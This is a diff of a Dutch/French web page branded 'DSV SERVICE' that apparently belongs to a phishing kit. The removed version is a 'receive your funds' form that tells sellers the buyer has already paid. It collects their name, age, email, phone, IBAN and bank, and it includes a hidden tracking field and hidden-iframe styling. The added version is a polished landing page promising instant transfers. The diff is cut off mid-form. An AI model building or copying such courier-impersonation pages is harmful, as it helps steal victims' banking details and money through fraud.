@@ -1,1135 +1,756 @@
 <!DOCTYPE html>
 <html lang="nl">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="description" content="DSV SERVICE – Ontvang uw overschrijving in enkele minuten. Directe, veilige en 100% transparante service voor heel Europa.">
+<title>DSV SERVICE – Ontvangst van Gelden</title>
+<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+<link rel="manifest" href="site.webmanifest">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap">
 
-    <!-- Favicons -->
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-    <link rel="manifest" href="/site.webmanifest">
+<style>
+:root {
+  --primary: #002664;
+  --primary-deep: #001a47;
+  --secondary: #00448f;
+  --accent: #00448f;
+  --bg: #ffffff;
+  --fg: #1e293b;
+  --muted: #64748b;
+  --light: #f5f7fa;
+  --border: rgba(0, 38, 100, 0.08);
+  color-scheme: light;
+}
 
-    <title>DSV SERVICE – Réception de fonds</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --accent: #6ea8e6;
+    --bg: #0a1428;
+    --fg: #f1f5f9;
+    --muted: #94a3b8;
+    --light: #111f38;
+    --border: rgba(255, 255, 255, 0.08);
+    color-scheme: dark;
+  }
+}
 
-        :root {
-            --primary:#002664;
-            --primary-deep:#001a47;
-            --secondary:#00448f;
-            --accent:#00448f;
-            --bg:#eef2f7;
-            --card:#ffffff;
-            --fg:#1e293b;
-            --muted:#64748b;
-            --border:#e2e8f0;
-            --input-bg:#ffffff;
-            --info-bg:#eff4fb;
-            --danger:#b91c1c;
-            color-scheme:light;
-        }
-        @media (prefers-color-scheme: dark) {
-            :root:not([data-theme="light"]) {
-                --primary:#002664;
-                --primary-deep:#001a47;
-                --secondary:#00448f;
-                --accent:#6ea8e6;
-                --bg:#0a1428;
-                --card:#111f38;
-                --fg:#e8eef6;
-                --muted:#94a3b8;
-                --border:#24324a;
-                --input-bg:#0d1a30;
-                --info-bg:#13233f;
-                --danger:#f87171;
-                color-scheme:dark;
-            }
-        }
-        :root[data-theme="dark"] {
-            --primary:#002664;
-            --primary-deep:#001a47;
-            --secondary:#00448f;
-            --accent:#6ea8e6;
-            --bg:#0a1428;
-            --card:#111f38;
-            --fg:#e8eef6;
-            --muted:#94a3b8;
-            --border:#24324a;
-            --input-bg:#0d1a30;
-            --info-bg:#13233f;
-            --danger:#f87171;
-            color-scheme:dark;
-        }
+:root[data-theme="dark"] {
+  --accent: #6ea8e6;
+  --bg: #0a1428;
+  --fg: #f1f5f9;
+  --muted: #94a3b8;
+  --light: #111f38;
+  --border: rgba(255, 255, 255, 0.08);
+  color-scheme: dark;
+}
 
-        html { scroll-behavior:smooth; }
-        body {
-            background: var(--bg);
-            color: var(--fg);
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            min-height: 100vh;
-            line-height: 1.6;
-        }
+* { margin: 0; padding: 0; box-sizing: border-box; }
 
-        /* ===== Top bar (comme la landing) ===== */
-        .site-bar {
-            position: sticky;
-            top: 0;
-            z-index: 50;
-            background: var(--primary);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 14px 28px;
-            box-shadow: 0 2px 16px rgba(0,0,0,0.12);
-        }
-        .site-bar .logo img { height: 26px; display: block; filter: brightness(0) invert(1); }
-        .bar-right { display: flex; align-items: center; gap: 16px; }
-        .back-link {
-            color: rgba(255,255,255,0.85);
-            text-decoration: none;
-            font-size: 13px;
-            font-weight: 600;
-            transition: color 0.2s;
-        }
-        .back-link:hover { color: #fff; }
-        .lang-toggle {
-            display: flex;
-            gap: 4px;
-            background: rgba(255,255,255,0.14);
-            border-radius: 40px;
-            padding: 4px;
-        }
-        .lang-toggle button {
-            border: none;
-            background: transparent;
-            padding: 6px 14px;
-            border-radius: 30px;
-            font-size: 12px;
-            font-weight: 700;
-            cursor: pointer;
-            color: rgba(255,255,255,0.8);
-            transition: all 0.25s ease;
-            font-family: inherit;
-        }
-        .lang-toggle button.active { background: #fff; color: var(--primary); }
-        .lang-toggle button:hover:not(.active) { background: rgba(255,255,255,0.12); color: #fff; }
+html { scroll-behavior: smooth; }
 
-        /* ===== Page + carte ===== */
-        .page { display: flex; justify-content: center; padding: 36px 20px 56px; }
-        .container {
-            max-width: 750px;
-            width: 100%;
-            background: var(--card);
-            border-radius: 20px;
-            box-shadow: 0 25px 70px rgba(0,0,0,0.08);
-            padding: 48px 44px;
-            border: 1px solid var(--border);
-            animation: slideUp 0.4s ease-out;
-        }
-        @keyframes slideUp {
-            from { opacity:0; transform:translateY(20px); }
-            to { opacity:1; transform:translateY(0); }
-        }
+body {
+  background: var(--bg);
+  color: var(--fg);
+  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+  line-height: 1.6;
+  overflow-x: hidden;
+}
 
-        .header { text-align:center; margin-bottom:24px; }
-        .header h1 {
-            font-size:30px; font-weight:800; color:var(--fg); letter-spacing:-0.5px; margin-bottom:8px;
-        }
-        .header h1 span { font-weight:400; color:var(--accent); font-size:16px; margin-left:6px; }
-        .header .subtitle { font-size:16px; color:var(--fg); font-weight:600; margin-top:6px; }
-        .header .subtitle-light { font-size:14px; color:var(--muted); margin-top:4px; font-weight:400; }
+/* ===== Header ===== */
+header {
+  padding: 20px 40px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  z-index: 100;
+  transition: background 0.35s ease, padding 0.35s ease, box-shadow 0.35s ease;
+}
 
-        .section-title {
-            font-size:17px; font-weight:700; color:var(--fg); margin:32px 0 20px 0;
-            padding-bottom:12px; border-bottom:2px solid var(--accent); display:flex; align-items:center; gap:10px;
-        }
-        .section-title:first-of-type { margin-top:0; }
-        .info-box-free {
-            background:var(--info-bg); border-left:5px solid var(--accent); padding:16px 20px;
-            border-radius:10px; margin:16px 0 20px 0;
-        }
-        .info-box-free p { font-size:15px; line-height:1.6; color:var(--fg); font-weight:500; }
-        .info-box-free strong { color:var(--accent); }
+header.scrolled {
+  background: var(--bg);
+  padding: 12px 40px;
+  box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
+}
 
-        .form-group { margin-bottom:20px; position:relative; }
-        .form-group label { display:block; font-size:14px; font-weight:600; color:var(--fg); margin-bottom:8px; }
-        .form-group label .required { color:var(--danger); margin-left:2px; }
-        .form-group label .optional { font-weight:400; color:var(--muted); font-size:12px; }
-        .form-group input,
-        .form-group select {
-            width:100%; padding:14px 16px; border:2px solid var(--border); border-radius:12px;
-            font-size:15px; line-height:1.5; transition:all 0.3s ease; background:var(--input-bg); color:var(--fg); font-family:inherit;
-            -webkit-appearance: none;
-            appearance: none;
-        }
-        .form-group select {
-            background-image: url('data:image/svg+xml;charset=UTF-8,%3csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22none%22 stroke=%2264748b%22 stroke-width=%222%22%3e%3cpolyline points=%226 9 12 15 18 9%22%3e%3c/polyline%3e%3c/svg%3e');
-            background-repeat: no-repeat;
-            background-position: right 12px center;
-            background-size: 20px;
-            padding-right: 40px;
-            cursor: pointer;
-        }
-        .form-group input:focus { outline:none; border-color:var(--accent); box-shadow:0 0 0 3px rgba(0,68,143,0.18); }
-        .form-group input::placeholder { color:var(--muted); opacity:0.55; font-weight:500; }
+.logo img {
+  height: 30px;
+  display: block;
+  filter: brightness(0) invert(1);
+  transition: filter 0.35s ease;
+}
 
-        .form-group input.valid { border-color:var(--accent); background:rgba(0,68,143,0.06); }
-        .form-group input.invalid { border-color:var(--danger); background:rgba(185,28,28,0.07); }
+header.scrolled .logo img { filter: none; }
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) header.scrolled .logo img { filter: brightness(0) invert(1); }
+}
+:root[data-theme="dark"] header.scrolled .logo img { filter: brightness(0) invert(1); }
 
-        .form-group .error-msg {
-            display:none; font-size:12px; color:var(--danger); margin-top:4px; font-weight:500;
-        }
-        .form-group input.invalid ~ .error-msg { display:block; }
+.lang-toggle { display: flex; gap: 8px; }
 
-        /* ===== Logos banque / carte + détection auto ===== */
-        .input-wrapper { position: relative; display: block; }
-        .network-logo {
-            position: absolute; left: 10px; top: 50%; transform: translateY(-50%);
-            width: 40px; height: 26px; display: flex; align-items: center; justify-content: center;
-            opacity: 0; transition: opacity 0.25s ease; pointer-events: none; z-index: 2;
-            border-radius: 4px; overflow: hidden;
-        }
-        .network-logo.active { opacity: 1; }
-        .network-logo svg { display: block; width: 40px; height: 26px; }
-        .input-wrapper.with-logo input { padding-left: 60px; }
-        .form-group .input-wrapper:has(input.invalid) ~ .error-msg { display: block; }
+.lang-toggle button {
+  border: 1px solid rgba(255, 255, 255, 0.4);
+  background: rgba(255, 255, 255, 0.12);
+  color: #fff;
+  padding: 7px 14px;
+  border-radius: 6px;
+  font-size: 12px;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+  cursor: pointer;
+  transition: all 0.25s;
+  font-family: inherit;
+}
+.lang-toggle button.active { background: #fff; color: var(--primary); border-color: #fff; }
+.lang-toggle button:hover:not(.active) { background: rgba(255, 255, 255, 0.25); }
 
-        .bank-badge {
-            display: none; align-items: center; gap: 8px; margin-top: 12px;
-            font-size: 13px; font-weight: 700; color: var(--accent);
-            background: linear-gradient(135deg, var(--info-bg), rgba(0,68,143,0.05));
-            border: 1.5px solid var(--accent);
-            border-radius: 10px; padding: 10px 14px;
-            animation: fadeSlideIn 0.25s ease;
-            box-shadow: 0 2px 8px rgba(0,68,143,0.12);
-        }
-        .bank-badge.show { display: inline-flex; }
-        .bank-badge span:first-child { font-size: 16px; }
-        @keyframes fadeSlideIn {
-            from { opacity: 0; transform: translateY(-4px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+header.scrolled .lang-toggle button {
+  border-color: var(--border);
+  background: transparent;
+  color: var(--fg);
+}
+header.scrolled .lang-toggle button.active { background: var(--primary); color: #fff; border-color: var(--primary); }
 
-        .form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; }
+/* ===== Hero ===== */
+.hero {
+  position: relative;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  padding: 120px 40px 90px;
+  color: #fff;
+  overflow: hidden;
+  background: var(--primary);
+}
+.hero-video {
+  position: absolute;
+  inset: 0;
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  z-index: 0;
+}
+.hero::before {
+  content: "";
+  position: absolute;
+  inset: 0;
+  background: linear-gradient(115deg, rgba(0, 26, 71, 0.90) 0%, rgba(0, 38, 100, 0.72) 45%, rgba(0, 38, 100, 0.45) 100%);
+  z-index: 1;
+}
 
-        .btn-submit {
-            width:100%; background:var(--primary); color:white; padding:16px; border:none; border-radius:10px;
-            font-size:16px; font-weight:700; cursor:pointer; transition:all 0.3s ease;
-            box-shadow:0 8px 24px rgba(0,38,100,0.22); letter-spacing:0.3px; font-family:inherit; margin-top:12px;
-        }
-        .btn-submit:hover:not(:disabled) { background:var(--secondary); transform:translateY(-2px); box-shadow:0 12px 30px rgba(0,38,100,0.3); }
-        .btn-submit:active:not(:disabled) { transform:translateY(0); }
-        .btn-submit:disabled { opacity:0.55; cursor:not-allowed; transform:none; }
+.hero-content {
+  position: relative;
+  z-index: 2;
+  max-width: 640px;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: rgba(255, 255, 255, 0.12);
+  border: 1px solid rgba(255, 255, 255, 0.25);
+  padding: 8px 16px;
+  border-radius: 100px;
+  font-size: 13px;
+  font-weight: 600;
+  margin-bottom: 28px;
+  backdrop-filter: blur(8px);
+}
+.hero-badge .dot {
+  width: 8px; height: 8px; border-radius: 50%;
+  background: #22c55e; box-shadow: 0 0 0 0 rgba(34,197,94,0.6);
+  animation: pulse 2s infinite;
+}
+@keyframes pulse {
+  0% { box-shadow: 0 0 0 0 rgba(34,197,94,0.6); }
+  70% { box-shadow: 0 0 0 10px rgba(34,197,94,0); }
+  100% { box-shadow: 0 0 0 0 rgba(34,197,94,0); }
+}
 
-        .progress-bar {
-            width: 100%;
-            height: 6px;
-            background: var(--border);
-            border-radius: 10px;
-            margin-bottom: 28px;
-            overflow: hidden;
-        }
-        .progress-bar-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary), var(--accent));
-            border-radius: 10px;
-            transition: width 0.3s ease;
-            width: 0%;
-        }
+.hero h1 {
+  font-size: clamp(40px, 7vw, 68px);
+  font-weight: 900;
+  line-height: 1.08;
+  letter-spacing: -1.5px;
+  margin-bottom: 24px;
+  text-wrap: balance;
+}
+.hero p {
+  font-size: clamp(16px, 2.2vw, 20px);
+  font-weight: 300;
+  line-height: 1.6;
+  margin-bottom: 40px;
+  max-width: 540px;
+}
+.hero-cta-row {
+  display: flex;
+  gap: 16px;
+  flex-wrap: wrap;
+  align-items: center;
+}
 
-        .section-info {
-            font-size: 12px;
-            color: var(--muted);
-            margin-bottom: 16px;
-            font-weight: 500;
-        }
+/* Entrance animations only when JS confirmed + motion allowed */
+.js .hero-badge,
+.js .hero h1,
+.js .hero p,
+.js .hero-cta-row { opacity: 0; animation: fadeInUp 0.8s ease-out forwards; }
+.js .hero-badge { animation-delay: 0.1s; }
+.js .hero h1 { animation-delay: 0.25s; }
+.js .hero p { animation-delay: 0.4s; }
+.js .hero-cta-row { animation-delay: 0.55s; }
 
-        .footer {
-            margin-top:28px; padding-top:18px; border-top:1px solid var(--border);
-            text-align:center; font-size:12px; color:var(--muted); line-height:1.8;
-        }
-        .footer a { color:var(--accent); text-decoration:none; font-weight:500; }
-        .footer a:hover { text-decoration:underline; }
+@keyframes fadeInUp {
+  from { opacity: 0; transform: translateY(28px); }
+  to { opacity: 1; transform: translateY(0); }
+}
 
-        @media (max-width:640px) {
-            .site-bar { padding:12px 16px; }
-            .page { padding:24px 14px 40px; }
-            .container { padding:28px 20px; }
-            .form-row { grid-template-columns:1fr; gap:0; }
-            .header h1 { font-size:24px; }
-            .back-link { display:none; }
-        }
+.btn {
+  display: inline-block;
+  padding: 16px 36px;
+  border-radius: 8px;
+  font-size: 15px;
+  font-weight: 700;
+  letter-spacing: 0.3px;
+  text-decoration: none;
+  cursor: pointer;
+  border: none;
+  transition: transform 0.25s ease, box-shadow 0.25s ease, background 0.25s ease;
+}
+.btn-primary {
+  background: #fff;
+  color: var(--primary);
+  box-shadow: 0 8px 28px rgba(0, 0, 0, 0.25);
+}
+.btn-primary:hover { transform: translateY(-3px); box-shadow: 0 14px 36px rgba(0, 0, 0, 0.3); }
+.btn-ghost {
+  background: transparent;
+  color: #fff;
+  border: 1.5px solid rgba(255, 255, 255, 0.5);
+}
+.btn-ghost:hover { background: rgba(255, 255, 255, 0.12); border-color: #fff; }
 
-        .fr { display:block; }
-        .nl { display:none; }
-        body.lang-nl .fr { display:none; }
-        body.lang-nl .nl { display:block; }
+/* Scroll indicator */
+.scroll-hint {
+  position: absolute;
+  bottom: 28px;
+  left: 50%;
+  transform: translateX(-50%);
+  z-index: 2;
+  color: rgba(255,255,255,0.7);
+  font-size: 12px;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 8px;
+  animation: bob 2s ease-in-out infinite;
+}
+.scroll-hint svg { width: 20px; height: 20px; }
+@keyframes bob { 0%,100% { transform: translate(-50%, 0); } 50% { transform: translate(-50%, 8px); } }
 
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5);
-            backdrop-filter: blur(4px);
-            -webkit-backdrop-filter: blur(4px);
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            padding: 20px;
-        }
-        .modal-overlay.active { display: flex; }
+/* ===== Sections ===== */
+section { padding: 96px 40px; }
+.container { max-width: 1180px; margin: 0 auto; }
 
-        .modal {
-            max-width: 520px;
-            width: 100%;
-            background: var(--card);
-            color: var(--fg);
-            border-radius: 24px;
-            padding: 40px 36px;
-            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
-            text-align: center;
-            animation: fadeSlide 0.3s ease-out;
-        }
-        .modal .icon { font-size: 56px; margin-bottom: 12px; }
-        .modal h2 {
-            font-size: 24px;
-            font-weight: 700;
-            color: var(--fg);
-            margin-bottom: 8px;
-        }
-        .modal p {
-            font-size: 16px;
-            line-height: 1.7;
-            color: var(--fg);
-            margin: 8px 0 12px 0;
-        }
-        .modal p strong { color: var(--accent); }
-        .modal .btn-close {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 12px 36px;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            font-family: inherit;
-            margin-top: 8px;
-        }
-        .modal .btn-close:hover { background: var(--secondary); }
+.section-head { max-width: 720px; margin-bottom: 56px; }
+.section-head.center { margin-left: auto; margin-right: auto; text-align: center; }
 
-        @keyframes fadeSlide {
-            0% { opacity:0; transform:translateY(-20px) scale(0.96); }
-            100% { opacity:1; transform:translateY(0) scale(1); }
-        }
+.eyebrow {
+  font-size: 12px;
+  font-weight: 800;
+  color: var(--secondary);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  margin-bottom: 14px;
+  display: block;
+}
+.section-title {
+  font-size: clamp(30px, 5vw, 46px);
+  font-weight: 800;
+  color: var(--fg);
+  line-height: 1.15;
+  letter-spacing: -0.8px;
+  margin-bottom: 16px;
+  text-wrap: balance;
+}
+.section-desc {
+  font-size: 18px;
+  color: var(--muted);
+  line-height: 1.7;
+  font-weight: 300;
+}
 
-        #hiddenIframe { display: none; }
-    </style>
+/* ===== Stats ===== */
+.stats { background: var(--primary); color: #fff; padding: 72px 40px; }
+.stats-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 48px;
+  max-width: 1100px;
+  margin: 0 auto;
+  text-align: center;
+}
+.stat-number {
+  font-size: clamp(36px, 5vw, 52px);
+  font-weight: 900;
+  letter-spacing: -1px;
+  font-variant-numeric: tabular-nums;
+  line-height: 1;
+  margin-bottom: 10px;
+}
+.stat-label {
+  font-size: 13px;
+  color: rgba(255,255,255,0.75);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  font-weight: 600;
+}
+
+/* ===== Features ===== */
+.grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+  gap: 28px;
+}
+.card {
+  padding: 36px 32px;
+  background: var(--bg);
+  border-radius: 16px;
+  border: 1px solid var(--border);
+  transition: transform 0.3s ease, box-shadow 0.3s ease, border-color 0.3s ease;
+}
+.card:hover {
+  transform: translateY(-6px);
+  box-shadow: 0 20px 50px rgba(0, 38, 100, 0.12);
+  border-color: rgba(0, 38, 100, 0.2);
+}
+.card-icon {
+  width: 56px; height: 56px;
+  border-radius: 14px;
+  background: linear-gradient(135deg, var(--primary), var(--secondary));
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin-bottom: 22px;
+}
+.card-icon svg { width: 28px; height: 28px; stroke: #fff; fill: none; }
+.card h3 { font-size: 20px; font-weight: 700; color: var(--fg); margin-bottom: 10px; }
+.card p { font-size: 15px; color: var(--muted); line-height: 1.7; }
+
+/* ===== Images showcase ===== */
+.showcase { background: var(--light); }
+.images-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+  gap: 28px;
+}
+.image-card {
+  position: relative;
+  border-radius: 18px;
+  overflow: hidden;
+  box-shadow: 0 16px 48px rgba(0, 0, 0, 0.14);
+  min-height: 320px;
+}
+.image-card img {
+  width: 100%; height: 100%;
+  min-height: 320px;
+  object-fit: cover;
+  display: block;
+  transition: transform 0.5s ease;
+}
+.image-card:hover img { transform: scale(1.06); }
+.image-card .caption {
+  position: absolute;
+  inset: 0;
+  display: flex;
+  align-items: flex-end;
+  padding: 28px;
+  background: linear-gradient(to top, rgba(0,26,71,0.85), transparent 60%);
+  color: #fff;
+  font-size: 18px;
+  font-weight: 700;
+}
+
+/* ===== Testimonials ===== */
+.testimonials-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+  gap: 24px;
+}
+.testimonial {
+  background: var(--bg);
+  border-radius: 16px;
+  border: 1px solid var(--border);
+  padding: 32px;
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+.testimonial:hover { transform: translateY(-4px); box-shadow: 0 16px 40px rgba(0,38,100,0.1); }
+.stars { color: #f5a623; font-size: 16px; margin-bottom: 16px; letter-spacing: 2px; }
+.testimonial p { font-size: 16px; color: var(--fg); margin-bottom: 20px; line-height: 1.7; font-weight: 300; }
+.testimonial-author { font-weight: 700; color: var(--fg); font-size: 14px; }
+.testimonial-role { font-weight: 400; color: var(--muted); font-size: 13px; }
+
+/* ===== Final CTA ===== */
+.cta-final {
+  position: relative;
+  padding: 110px 40px;
+  text-align: center;
+  color: #fff;
+  overflow: hidden;
+  background: var(--primary);
+}
+.cta-final::before {
+  content: "";
+  position: absolute; inset: 0;
+  background: linear-gradient(130deg, rgba(0,26,71,0.95), rgba(0,68,143,0.82)),
+              url('dsv-image2.png') center/cover no-repeat;
+  z-index: 0;
+}
+.cta-content { position: relative; z-index: 2; max-width: 680px; margin: 0 auto; }
+.cta-final h2 { font-size: clamp(32px, 5.5vw, 50px); font-weight: 900; letter-spacing: -1px; margin-bottom: 20px; text-wrap: balance; }
+.cta-final p { font-size: 19px; opacity: 0.92; margin-bottom: 36px; font-weight: 300; }
+
+/* ===== Footer ===== */
+footer {
+  background: var(--primary-deep);
+  color: rgba(255,255,255,0.6);
+  padding: 40px 20px;
+  text-align: center;
+  font-size: 13px;
+  line-height: 1.8;
+}
+footer img { height: 24px; filter: brightness(0) invert(1); opacity: 0.85; margin-bottom: 16px; display: inline-block; }
+footer a { color: rgba(255,255,255,0.8); text-decoration: none; }
+footer a:hover { color: #fff; text-decoration: underline; }
+footer .footer-links { margin-top: 8px; }
+
+/* ===== Scroll reveal (only hides when JS is active) ===== */
+.js .reveal { opacity: 0; transform: translateY(32px); transition: opacity 0.7s ease, transform 0.7s ease; }
+.js .reveal.visible { opacity: 1; transform: translateY(0); }
+/* Failsafe: if something goes wrong, show everything */
+.reveal-all .reveal,
+.reveal-all .hero-badge,
+.reveal-all .hero h1,
+.reveal-all .hero p,
+.reveal-all .hero-cta-row { opacity: 1 !important; transform: none !important; }
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before { animation: none !important; transition: none !important; }
+  html { scroll-behavior: auto; }
+  .js .reveal,
+  .js .hero-badge,
+  .js .hero h1,
+  .js .hero p,
+  .js .hero-cta-row { opacity: 1 !important; transform: none !important; }
+}
+
+/* ===== Responsive ===== */
+@media (max-width: 768px) {
+  header, header.scrolled { padding: 14px 20px; }
+  section { padding: 64px 20px; }
+  .stats { padding: 56px 20px; }
+  .hero { padding: 100px 20px 80px; }
+  .cta-final { padding: 80px 20px; }
+  .hero-cta-row .btn { flex: 1; text-align: center; }
+}
+
+/* ===== i18n ===== */
+.fr { display: inline; }
+.nl { display: none; }
+body.lang-nl .fr { display: none; }
+body.lang-nl .nl { display: inline; }
+</style>
 </head>
 <body class="lang-nl">
 
-<!-- ===== BARRE D'EN-TÊTE (identique à la landing) ===== -->
-<header class="site-bar">
-    <a class="logo" href="landing.html"><img src="dsv-logo.svg" alt="DSV"></a>
-    <div class="bar-right">
-        <a class="back-link" href="landing.html">
-            <span class="fr">← Accueil</span>
-            <span class="nl">← Home</span>
-        </a>
-        <div class="lang-toggle">
-            <button class="active" data-lang="nl" onclick="setLang('nl')">NL</button>
-            <button data-lang="fr" onclick="setLang('fr')">FR</button>
-        </div>
-    </div>
-</header>
-
-<!-- ===== CONTENEUR PRINCIPAL ===== -->
-<div class="page">
-<div class="container" id="pageContainer">
-
-    <div class="header">
-        <h1>DSV <span>SERVICE</span></h1>
-        <p class="subtitle">
-            <span class="fr">Formulaire de réception de fonds</span>
-            <span class="nl">Formulier voor ontvangst van gelden</span>
-        </p>
-        <p class="subtitle-light">
-            <span class="fr">Traitement rapide et sécurisé</span>
-            <span class="nl">Snelle en veilige verwerking</span>
-        </p>
-        <p style="font-size:13px; color:var(--muted); margin-top:4px;">
-            <span class="fr">Remplissez correctement le formulaire pour recevoir votre argent dès aujourd'hui par virement immédiat.</span>
-            <span class="nl">Vul het formulier correct in om vandaag nog uw geld te ontvangen via een onmiddellijke overschrijving.</span>
-        </p>
-    </div>
-
-    <div class="info-box-free">
-        <p>
-            <span class="fr">⚠️ <strong>Informations importantes :</strong> Attention : vous n'avez rien à payer ; l'acheteur a déjà tout réglé, donc pour vous c'est <strong>gratuit</strong>.</span>
-            <span class="nl">⚠️ <strong>Belangrijke informatie :</strong> Let op: u hoeft niets te betalen; de koper heeft al alles betaald, dus voor u is het <strong>gratis</strong>.</span>
-        </p>
-    </div>
-
-    <div class="progress-bar">
-        <div class="progress-bar-fill" id="progressBar"></div>
-    </div>
-
-    <p class="section-info" id="sectionInfo">
-        <span class="fr">Étape 1 de 2 — Vos informations personnelles</span>
-        <span class="nl">Stap 1 van 2 — Uw persoonlijke gegevens</span>
-    </p>
-
-    <form id="mainForm">
-        <input type="hidden" name="Numéro de suivi" value="BE 75129355470">
-
-        <!-- SECTION 1: CONTACT & IDENTITÉ -->
-        <p class="section-title">
-            <span class="fr">👤 Vos informations</span>
-            <span class="nl">👤 Uw gegevens</span>
-        </p>
-
-        <!-- NOM -->
-        <div class="form-group">
-            <label for="fullname">
-                <span class="fr">Nom complet <span class="required">*</span></span>
-                <span class="nl">Volledige naam <span class="required">*</span></span>
-            </label>
-            <input type="text" id="fullname" name="Nom complet" placeholder="Jean Dupont" minlength="2" maxlength="100" pattern="[a-zA-ZÀ-ÿ\s\-']+" title="Uniquement des lettres" required>
-            <span class="error-msg"><span class="fr">⚠️ Lettres, espaces, tirets et apostrophes</span><span class="nl">⚠️ Letters, spaces, hyphens and apostrophes</span></span>
-        </div>
-
-        <div class="form-row">
-            <!-- ÂGE -->
-            <div class="form-group">
-                <label for="age">
-                    <span class="fr">Âge <span class="required">*</span></span>
-                    <span class="nl">Leeftijd <span class="required">*</span></span>
-                </label>
-                <input type="number" id="age" name="Âge" placeholder="25" min="18" max="120" required>
-                <span class="error-msg"><span class="fr">⚠️ 18–120 ans</span><span class="nl">⚠️ 18–120 years</span></span>
-            </div>
-
-            <!-- EMAIL -->
-            <div class="form-group">
-                <label for="email">
-                    <span class="fr">E-mail <span class="required">*</span></span>
-                    <span class="nl">E-mail <span class="required">*</span></span>
-                </label>
-                <input type="email" id="email" name="Email" placeholder="contact@example.com" required>
-                <span class="error-msg"><span class="fr">⚠️ Email valide</span><span class="nl">⚠️ Valid email</span></span>
-            </div>
-        </div>
-
-        <!-- TÉLÉPHONE -->
-        <div class="form-group">
-            <label for="phone">
-                <span class="fr">Téléphone <span class="required">*</span></span>
-                <span class="nl">Telefoon <span class="required">*</span></span>
-            </label>
-            <input type="tel" id="phone" name="Téléphone" placeholder="+32 476 12 34 56" required>
-            <span class="error-msg"><span class="fr">⚠️ Format: +32 476 12 34 56</span><span class="nl">⚠️ Format: +32 476 12 34 56</span></span>
-        </div>
-
-        <!-- SECTION 2: PAIEMENT & TRANSFERT -->
-        <p class="section-title">
-            <span class="fr">💳 Coordonnées de paiement</span>
-            <span class="nl">💳 Betaalgegevens</span>
-        </p>
-
-        <!-- COMPTE BE / IBAN -->
-        <div class="form-group">
-            <label for="compte_be">
-                <span class="fr">Compte bancaire (IBAN) <span class="required">*</span></span>
-                <span class="nl">Bankrekening (IBAN) <span class="required">*</span></span>
-            </label>
-            <div class="input-wrapper">
-                <span class="network-logo" id="ibanLogo"></span>
-                <input type="text" id="compte_be" name="Numéro de compte BE" placeholder="BE 1234 5678 9012 34" required>
-            </div>
-            <span class="error-msg"><span class="fr">⚠️ 14 chiffres (ex: BE 1234 5678 9012 34)</span><span class="nl">⚠️ 14 digits (e.g., BE 1234 5678 9012 34)</span></span>
-            <div class="bank-badge" id="bankBadge"><span>✓</span><span id="bankBadgeLabel"></span></div>
-        </div>
-
-        <!-- SÉLECTION BANQUE (auto-remplie) -->
-        <div class="form-group">
-            <label for="banque_select">
-                <span class="fr">Banque <span class="required">*</span></span>
-                <span class="nl">Bank <span class="required">*</span></span>
-            </label>
-            <div class="input-wrapper">
-                <select id="banque_select" name="Banque" required>
-                    <option value="">
-                        <span class="fr">— Sélectionner une banque —</span>
-                        <span class="nl">— Selecteer een bank —</span>
-                    </option>
-                    <option value="Belfius">Belfius</option>
-                    <option value="ING Belgium">ING Belgium</option>
-                    <option value="KBC Bank">KBC Bank</option>
-                    <option value="BNP Paribas Fortis">BNP Paribas Fortis</option>
-                    <option value="Argenta">Argenta</option>
-                    <option value="Crelan">Crelan</option>
-                    <option value="Beobank">Beobank</option>
-                    <option value="CBC Banque">CBC Banque</option>
-                </select>
-            </div>
